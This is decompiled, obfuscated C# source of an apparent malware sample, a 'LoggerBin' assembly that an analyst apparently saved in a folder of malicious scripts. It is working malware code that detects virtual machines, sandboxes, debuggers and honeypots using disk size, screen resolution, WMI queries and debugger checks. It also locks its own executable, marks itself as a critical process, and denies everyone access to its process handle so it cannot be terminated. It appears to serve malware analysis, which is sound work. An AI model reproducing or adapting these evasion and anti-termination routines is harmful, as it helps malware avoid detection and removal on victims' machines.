// Decompiled with JetBrains decompiler
// Type: RW9.KWk
// Assembly: service-nankasa.com-LoggerBin, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 762D1AAC-A39C-4AEB-81B7-3308162A414F
// Assembly location: C:\Users\darbinis\Desktop\Code analysis\Mallicious skriptai\Atack 09-17\RegAsm.exe

using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Management;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Threading;
using System.Windows.Forms;
using VW1;

namespace RW9
{
  internal class KWk
  {
    public FileStream FS;
    private static KWk Xl1;

    public void PWm()
    {
      if (Convert.ToBoolean(XWr.EnableAntiHoneypot) && Kdz.bx((object) this, Kdz.hIs))
        yd.bx(yd.EIx);
      if (Convert.ToBoolean(XWr.EnableAntiVMware) && (Kdz.bx((object) this, Kdz.eId) || (Kdz.bx((object) this, Kdz.vII) || Kdz.bx((object) this, Kdz.wI5))))
        yd.bx(yd.EIx);
      if (Convert.ToBoolean(XWr.EnableAntiDebugger))
        goto label_9;
label_3:
      if (!KWk.Tlb((object) XWr.EnableAntiSandboxie) || !Kdz.bx((object) this, Kdz.fIB))
        return;
      yd.bx(yd.EIx);
      return;
label_9:
      int num1 = 0;
      if (KWk.nlL() != null)
        goto label_10;
label_1:
      switch (num1)
      {
        default:
          if (Kdz.bx((object) this, Kdz.pIP))
          {
            yd.bx(yd.EIx);
            goto label_3;
          }
          else
            goto label_3;
      }
label_10:
      int num2;
      num1 = num2;
      goto label_1;
    }

    public void KWb()
    {
      try
      {
        this.FS = new FileStream(Application.ExecutablePath, FileMode.Open, FileAccess.Read, FileShare.None);
      }
      catch
      {
      }
      try
      {
        XIr.bx(Process.GetCurrentProcess().Handle, XIr.BIM);
      }
      catch
      {
      }
      Thread.Sleep(-1);
    }

    private static void SWa(IntPtr _param0, RawSecurityDescriptor _param1)
    {
      byte[] binaryForm = new byte[checked (_param1.BinaryLength - 1 + 1 - 1 + 1)];
      _param1.GetBinaryForm(binaryForm, 0);
      if (!qIo.bx(_param0, 4, binaryForm, qIo.IIE))
        throw new Exception();
    }

    private static rWU IWO<rWU>(ref rWU _param0, rWU hWD)
    {
      _param0 = hWD;
      return hWD;
    }

    private static RawSecurityDescriptor EWz(IntPtr _param0)
    {
      byte[] binaryForm = new byte[0];
      uint num = 0;
      VIH.bx(_param0, 4, binaryForm, 0U, ref num, VIH.xI7);
      if (num < 0U || num > (uint) short.MaxValue)
        throw new Exception();
      if (!VIH.bx(_param0, 4, KWk.IWO<byte[]>(ref binaryForm, new byte[checked ((int) ((ulong) num - 1UL) + 1 - 1 + 1)]), num, ref num, VIH.xI7))
        throw new Exception();
      return new RawSecurityDescriptor(binaryForm, 0);
    }

    private static void Protect(IntPtr processHandle)
    {
      RawSecurityDescriptor securityDescriptor = SIA.bx(processHandle, SIA.iI4);
      securityDescriptor.DiscretionaryAcl.InsertAce(0, (GenericAce) new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 987135, new SecurityIdentifier(WellKnownSidType.WorldSid, (SecurityIdentifier) null), false, (byte[]) null));
      WIY.bx(processHandle, securityDescriptor, WIY.QIJ);
    }

    private bool RCR()
    {
      try
      {
        long num = 61000000000;
        if (new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize <= num)
          return true;
      }
      catch
      {
      }
      return false;
    }

    private bool cCW()
    {
      try
      {
        if (kdq.bx(kdq.QIZ).ToLower().Contains(w4.bx(11282, w4.vY)))
          return true;
      }
      catch
      {
      }
      return false;
    }

    private bool JCC()
    {
      try
      {
        using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(w4.bx(11290, w4.vY)))
        {
          using (ManagementObjectCollection objectCollection = managementObjectSearcher.Get())
          {
            foreach (ManagementBaseObject managementBaseObject in objectCollection)
            {
              string lower = managementBaseObject[w4.bx(11362, w4.vY)].ToString().ToLower();
              if (lower == w4.bx(11390, w4.vY) && managementBaseObject[w4.bx(11436, w4.vY)].ToString().ToUpperInvariant().Contains(w4.bx(11450, w4.vY)) || (KWk.nln((object) lower, (object) w4.bx(11468, w4.vY)) || managementBaseObject[w4.bx(11436, w4.vY)].ToString() == w4.bx(11484, w4.vY)))
                return true;
            }
          }
        }
      }
      catch
      {
      }
      return false;
    }

    private bool oC6()
    {
      bool flag = false;
      try
      {
        qIe.bx(Process.GetCurrentProcess().Handle, ref flag, qIe.hIf);
        return flag;
      }
      catch
      {
      }
      return flag;
    }

    private bool KCY()
    {
      try
      {
        if (qdk.bx(w4.bx(11508, w4.vY), qdk.NIl).ToInt32() != 0)
          return true;
      }
      catch
      {
      }
      return false;
    }

    public bool GCs()
    {
      try
      {
        Size primaryMonitorSize = SystemInformation.PrimaryMonitorSize;
        int height = primaryMonitorSize.Height;
        primaryMonitorSize = SystemInformation.PrimaryMonitorSize;
        int width = primaryMonitorSize.Width;
        if (width == 1440 && height == 900 || width <= 1024 && height <= 768 || (!Environment.Is64BitOperatingSystem || kdq.bx(kdq.SIp).Contains(w4.bx(11534, w4.vY))))
          return true;
        if (kdq.bx(kdq.dIC).Contains(w4.bx(11546, w4.vY)))
          return true;
      }
      catch
      {
      }
      return false;
    }

    [DllImport("kernel32.dll", EntryPoint = "GetModuleHandle")]
    public static extern IntPtr iCv(string _param0);

    [DllImport("kernel32.dll", EntryPoint = "CheckRemoteDebuggerPresent", SetLastError = true)]
    private static extern bool XCP(IntPtr _param0, ref bool _param1);

    public KWk()
    {
      yd.bx(yd.EI);
      // ISSUE: explicit constructor call
      base.\u002Ector();
    }

    internal static bool Tlb([In] object obj0) => Convert.ToBoolean((string) obj0);

    internal static bool wl0() => KWk.Xl1 == null;

    internal static KWk nlL() => KWk.Xl1;

    internal static bool nln([In] object obj0, [In] object obj1) => ((string) obj0).Contains((string) obj1);
  }
}
